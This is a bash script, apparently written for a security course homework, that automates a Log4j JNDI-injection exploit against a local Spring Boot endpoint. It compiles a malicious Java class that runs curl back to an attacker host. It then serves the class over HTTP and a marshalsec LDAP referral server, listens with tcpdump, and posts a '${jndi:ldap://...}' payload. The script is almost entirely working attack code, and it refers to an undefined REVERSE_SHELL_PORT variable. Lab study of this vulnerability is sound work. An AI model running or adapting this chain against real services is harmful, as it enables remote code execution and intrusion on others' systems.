# this file is to automate the exploit process that i ran manually with a considerable amount of time consuming
#!/bin/bash

# CONFIGURATION
ATTACKER_IP="YOUR_PUBLIC_IP"  # Change this to your public IP
HTTP_PORT=8000
LDAP_PORT=1389
CALLBACK_PORT=9999
EXPLOIT_CLASS="Exploit"
EXPLOIT_PATH="$(pwd)/exploit"

# STEP 1: Compile Exploit.java
# ====== COMPILE MALICIOUS JAVA CLASS ======
echo "[*] Compiling $EXPLOIT_CLASS.java..."
cd ~/DC8-SEAS8405/Homework9/exploit || exit 1
cat <<EOF > $EXPLOIT_CLASS.java
public class $EXPLOIT_CLASS {
    static {
        try {
            Runtime.getRuntime().exec("curl http://$ATTACKER_IP:$REVERSE_SHELL_PORT/");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
EOF

javac $EXPLOIT_CLASS.java
echo "[+] Compilation done."

# STEP 2: Start HTTP server in background
echo "[*] Starting HTTP server on port $HTTP_PORT..."
cd $EXPLOIT_PATH
python3 -m http.server $HTTP_PORT > /dev/null 2>&1 &
HTTP_PID=$!
cd - > /dev/null

# STEP 3: Start LDAPRefServer in background
echo "[*] Starting LDAPRefServer on port $LDAP_PORT..."
java -cp marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer http://$ATTACKER_IP:$HTTP_PORT/#$EXPLOIT_CLASS > /dev/null 2>&1 &
LDAP_PID=$!

# STEP 4: Start tcpdump to listen for callback
echo "[*] Listening for callback on port $CALLBACK_PORT..."
sudo tcpdump -n -i any port $CALLBACK_PORT &

# STEP 5: Trigger exploit via Spring Boot vulnerable endpoint
sleep 2
echo "[*] Triggering exploit payload..."
curl -X POST http://localhost:8080/log \
  -H 'Content-Type: application/json' \
  -d "{\"input\": \"\${jndi:ldap://$ATTACKER_IP:$LDAP_PORT/$EXPLOIT_CLASS}\"}"

# WAIT for user to observe tcpdump or logs
echo "[*] Exploit triggered. Watch tcpdump output and HTTP server logs."
echo "[*] Press Ctrl+C to stop everything when done."
